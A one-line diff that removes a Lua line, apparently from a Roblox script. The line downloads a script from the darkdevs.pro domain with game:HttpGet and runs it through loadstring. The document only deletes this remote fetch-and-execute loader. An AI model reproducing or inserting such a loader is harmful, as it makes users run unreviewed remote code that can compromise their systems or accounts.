@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://nto.darkdevs.pro/uploads/wrath22.lua',true))()
